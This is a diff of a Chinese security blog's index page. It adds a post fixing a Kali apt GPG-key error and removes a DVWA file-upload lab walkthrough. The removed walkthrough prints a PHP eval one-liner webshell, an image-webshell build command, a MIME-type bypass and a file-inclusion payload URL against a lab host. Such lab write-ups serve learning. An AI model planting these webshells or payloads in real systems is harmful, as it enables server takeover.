@@ -252,6 +252,163 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/19/kali update error/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/19/kali update error/" itemprop="url">解决kali执行apt update时报错</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-19T23:27:48+08:00">
+                2018-03-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kali/" itemprop="url" rel="index">
+                    <span itemprop="name">kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="解决kali执行apt-update时报错"><a href="#解决kali执行apt-update时报错" class="headerlink" title="解决kali执行apt update时报错"></a>解决kali执行apt update时报错</h1><p><strong>更新kali时在执行apt update遇到如下错误</strong></p>
+<pre><code>Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB]
+Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease
+The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+945 packages can be upgraded. Run &apos;apt list --upgradable&apos; to see them.
+W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
+W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
+W: Some index files failed to download. They have been ignored, or old ones used instead.
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/9DHI71m4ee.png?imageslim" alt="mark"></p>
+<p><strong>解决方法</strong></p>
+<pre><code>apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/KGI19B7egm.png?imageslim" alt="mark"></p>
+<p><strong>再次执行就可以成功执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/m3L1eiGCcd.png?imageslim" alt="mark"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/routestatic/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2364,360 +2521,6 @@ if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/25/DVWAFileUpload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/LuFei.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/25/DVWAFileUpload/" itemprop="url">dvwa File Upload</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-25T17:59:14+08:00">
-                2017-12-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="dvwa文件上传"><a href="#dvwa文件上传" class="headerlink" title="dvwa文件上传"></a>dvwa文件上传</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>文件上传漏洞是由于服务器对客户端上传的文件过滤不严导致恶意用户上传服务器可执行的web脚本语言，攻击者可以利用该漏洞获取网站的webshell，用菜刀连接进行提权等操作，攻击者可能利用此漏洞就能拿到服务器权限</strong></p>
-<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong></p>
-<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p>
-<pre><code>&lt;?php
-
-if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
-    // Where are we going to be writing to?
-    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
-    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
-
-    // Can we move the file to the upload folder?
-    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {
-        // No
-        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
-    }
-    else {
-        // Yes!
-        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
-    }
-}
-
-?&gt;
-</code></pre><p><strong>在此之前先来了解一下php的$_FILES变量以及与php文件上传有关的知识</strong></p>
-<pre><code>$_FILES数组内容如下:
-$_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。
-$_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。
-$_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。
-$_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。
-$_FILES[&apos;myFile&apos;][&apos;error&apos;] 和该文件上传相关的错误代码。[&apos;error&apos;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量)
-UPLOAD_ERR_OK
-值：0; 没有错误发生，文件上传成功。
-UPLOAD_ERR_INI_SIZE
-值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。
-UPLOAD_ERR_FORM_SIZE
-值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。
-UPLOAD_ERR_PARTIAL
-值：3; 文件只有部分被上传。
-UPLOAD_ERR_NO_FILE
-值：4; 没有文件被上传。
-值：5; 上传文件大小为0.
-
-文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。
-</code></pre><p><strong>下面我们来看php代码，可以看到服务器在接收到了用户上传的文件后没有任何检查便直接将文件用<code>move_uploaded_file</code>函数移动到了dvwa目录下的hackable/uploads/目录下</strong></p>
-<p><strong>所以我们直接上传php一句话木马即可拿到网站webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/a3AahEGdcH.PNG" alt="mark"><br><strong>shell.php</strong></p>
-<pre><code>&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;
-</code></pre><p><strong>访问webshell地址，测试是否上传成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/chbKadDlC3.PNG" alt="mark"><br><strong>上传成功后得到webshell地址，用中国菜刀连接即可进行更进一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/Eb9JBClfCI.PNG" alt="mark"></p>
-<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
-<pre><code>&lt;?php
-
-if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
-    // Where are we going to be writing to?
-    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
-    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
-
-    // File information
-    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
-    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];
-    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
-
-    // Is it an image?
-    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;
-        ( $uploaded_size &lt; 100000 ) ) {
-
-        // Can we move the file to the upload folder?
-        if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {
-        // No
-        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
-        }
-        else {
-            // Yes!
-            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
-        }
-    }
-    else {
-        // Invalid file
-        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
-    }
-}
-
-?&gt;
-</code></pre><p><strong>可以看出服务器对<code>$_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]</code>变量，也就是上传文件的MIME 类型进行了检查，同时也对文件大小做了限制，但是文件的MIME 类型检查我们是可以通过修改文件上传http数据包绕过的</strong></p>
-<p><strong>上传文件，burp抓包，发送至Repeater</strong></p>
-<p><strong>将数据包里的<code>Content-Type: application/octet-stream</code>改为服务器允许的类型<code>Content-Type: image/jpeg</code>，就能拿到网站的webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/kJ74eiH9I7.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/1Fgf17Fdbl.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/aIFg6m7hFH.PNG" alt="mark"></p>
-<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p>
-<pre><code>&lt;?php
-
-if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
-    // Where are we going to be writing to?
-    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
-    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
-
-    // File information
-    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
-    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);
-    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
-    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];
-
-    // Is it an image?
-    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;
-        ( $uploaded_size &lt; 100000 ) &amp;&amp;
-        getimagesize( $uploaded_tmp ) ) {
-
-        // Can we move the file to the upload folder?
-        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
-            // No
-            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
-        }
-        else {
-            // Yes!
-            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
-        }
-    }
-    else {
-        // Invalid file
-        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
-}
-}
-
-?&gt;
-</code></pre><p><strong>可以看出服务器对文件后缀名进行了检查，并且用getimagesize函数检查文件是否为图片</strong></p>
-<p><strong>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</strong></p>
-<p><strong>在这里我们利用图片马绕过上传，并且利用dvwa的文件包含漏洞包含图片马，使服务器将图片马当做php解析运行</strong></p>
-<p><strong>图片马制作，进入cmd，输入以下命令</strong></p>
-<pre><code>copy heishacker.jpg/b+shell.php/b heishacker.jpg
-</code></pre><p><strong>heisheike.jpg:一张普通的图片，图片不能太大，否则会上传失败</strong><br><strong>shell.php:php一句话木马</strong></p>
-<p><strong><code>/b将文件以二进制格式连接</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/e3kIBcmlfd.PNG" alt="mark"><br><strong>将图片马上传，上传成功，但是由于后缀名为jpg，所以被服务器当成了图片解析而不是php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/c5dchjAidc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/gjEe4ib82i.PNG" alt="mark"><br><strong>接下来利用文件包含漏洞包含图片马</strong></p>
-<p><strong>dvwa文件包含漏洞high级别代码</strong></p>
-<pre><code>&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &apos;page&apos; ];
-if(!function_exists(&apos;fnmatch&apos;)) {
-
-    function fnmatch($pattern, $string) {
-        return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\*&apos; =&gt; &apos;.*&apos;, &apos;\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string);
-    } // end
-
-} // end if
-// Input validation
-if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
-    // This isn&apos;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-}
-
-?&gt;
-</code></pre><p><strong>可见文件包含出必须以file开头，我们用file协议读取图片马，payload</strong></p>
-<pre><code>`http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=file:///C:/wamp/www/DVWA-master/hackable/uploads/heishacker.jpg`
-</code></pre><p><strong>可以发现利用文件包含使服务器将图片马当做php解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/4BBg82g8lA.PNG" alt="mark"><br><strong>可以用php的system函数执行cmd命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/CEm97HHc02.PNG" alt="mark"></p>
-<h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p>
-<pre><code>&lt;?php
-
-if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
-
-
-    // File information
-    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
-    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);
-    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
-    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];
-    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];
-
-    // Where are we going to be writing to?
-    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;
-    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;
-    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;
-    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );
-    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;
-
-    // Is it an image?
-    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;
-        ( $uploaded_size &lt; 100000 ) &amp;&amp;
-        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;
-        getimagesize( $uploaded_tmp ) ) {
-
-        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
-        if( $uploaded_type == &apos;image/jpeg&apos; ) {
-            $img = imagecreatefromjpeg( $uploaded_tmp );
-            imagejpeg( $img, $temp_file, 100);
-        }
-        else {
-            $img = imagecreatefrompng( $uploaded_tmp );
-            imagepng( $img, $temp_file, 9);
-        }
-        imagedestroy( $img );
-
-        // Can we move the file to the web root from the temp folder?
-        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
-            // Yes!
-            echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;
-        }
-        else {
-            // No
-            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
-        }
-
-        // Delete any temp files
-        if( file_exists( $temp_file ) )
-            unlink( $temp_file );
-    }
-    else {
-        // Invalid file
-        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
-    }
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?&gt;
-</code></pre><p><strong>Impossible级别的代码对上传文件进行了重命名，加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2772,7 +2575,7 @@ generateSessionToken();
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2783,7 +2586,7 @@ generateSessionToken();
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2794,7 +2597,7 @@ generateSessionToken();
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
